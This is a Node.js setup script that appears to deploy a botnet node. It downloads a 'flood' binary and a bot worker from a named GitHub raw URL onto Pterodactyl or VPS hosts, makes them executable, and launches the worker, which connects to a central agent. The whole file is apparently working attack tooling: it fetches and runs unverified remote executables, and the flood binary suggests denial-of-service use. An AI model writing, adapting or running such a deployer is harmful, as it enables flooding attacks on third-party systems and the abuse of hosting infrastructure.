/**
 * Bot v2 Setup Script - Pure Node.js (Pterodactyl & VPS Compatible)
 * Downloads or copies lightweight C++ flood (< 100 KB) & bot worker.
 * Connects directly to Agent v2 unified single port.
 */

const https = require('https');
const http  = require('http');
const fs    = require('fs');
const path  = require('path');
const { spawn } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main';

const FILES_TO_DOWNLOAD = [
    { url: `${REPO_BASE}/bots/bot`,       filename: 'bot',       executable: true  },
    { url: `${REPO_BASE}/agent.txt`,      filename: 'agent.txt', executable: false },
];

function download(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return download(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`HTTP ${res.statusCode} — ${url}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);
            fileStream.on('finish', () => fileStream.close(resolve));
            fileStream.on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
        }).on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
    });
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up Bot v2 in: ${targetDir}`);

    // Check local lightweight flood first from methods_cpp
    const localFlood = path.join(__dirname, '..', 'methods_cpp', 'flood');
    const targetFlood = path.join(targetDir, 'flood');

    if (fs.existsSync(localFlood)) {
        console.log('[*] Using local lightweight C++ flood binary...');
        fs.copyFileSync(localFlood, targetFlood);
        fs.chmodSync(targetFlood, 0o755);
    } else if (!fs.existsSync(targetFlood)) {
        try {
            process.stdout.write(`[*] Downloading flood binary... `);
            await download(`${REPO_BASE}/bots/flood?t=${Date.now()}`, targetFlood);
            fs.chmodSync(targetFlood, 0o755);
            console.log('OK');
        } catch (err) {
            console.log('FAILED');
            console.error(`[!] Failed to download flood: ${err.message}`);
        }
    }

    // Check or download bot & agent.txt
    for (const item of FILES_TO_DOWNLOAD) {
        const dest = path.join(targetDir, item.filename);
        if (!fs.existsSync(dest)) {
            // Check if available locally
            const localFile = path.join(__dirname, '..', item.filename === 'bot' ? 'bots/bot' : item.filename);
            if (fs.existsSync(localFile)) {
                fs.copyFileSync(localFile, dest);
                if (item.executable) fs.chmodSync(dest, 0o755);
                console.log(`[*] Copied local ${item.filename}`);
                continue;
            }

            try {
                process.stdout.write(`[*] Downloading ${item.filename}... `);
                await download(`${item.url}?t=${Date.now()}`, dest);
                console.log('OK');
                if (item.executable) {
                    fs.chmodSync(dest, 0o755);
                    console.log(`[+] chmod +x ${item.filename}`);
                }
            } catch (err) {
                console.log('FAILED');
                console.error(`[!] ${item.filename}: ${err.message}`);
            }
        }
    }

    const botBin = path.join(targetDir, 'bot');
    if (!fs.existsSync(botBin)) {
        console.error('[-] Bot binary not found, aborting.');
        process.exit(1);
    }

    console.log('[+] Launching Bot v2 worker...');
    const child = spawn(botBin, [], {
        cwd:   targetDir,
        stdio: ['inherit', 'pipe', 'pipe'],
    });

    child.stdout.on('data', (d) => process.stdout.write(d));
    child.stderr.on('data', (d) => process.stderr.write(d));
    child.on('error', (err) => { console.error(`[!] ${err.message}`); process.exit(1); });
    child.on('exit',  (code, sig) => {
        console.log(`[!] Bot v2 exited: code=${code} signal=${sig}`);
        process.exit(code || 0);
    });

    process.on('SIGINT',  () => child.kill('SIGINT'));
    process.on('SIGTERM', () => child.kill('SIGTERM'));
}

setup().catch((err) => {
    console.error(`[!] Bot v2 setup failed: ${err.message}`);
    process.exit(1);
});
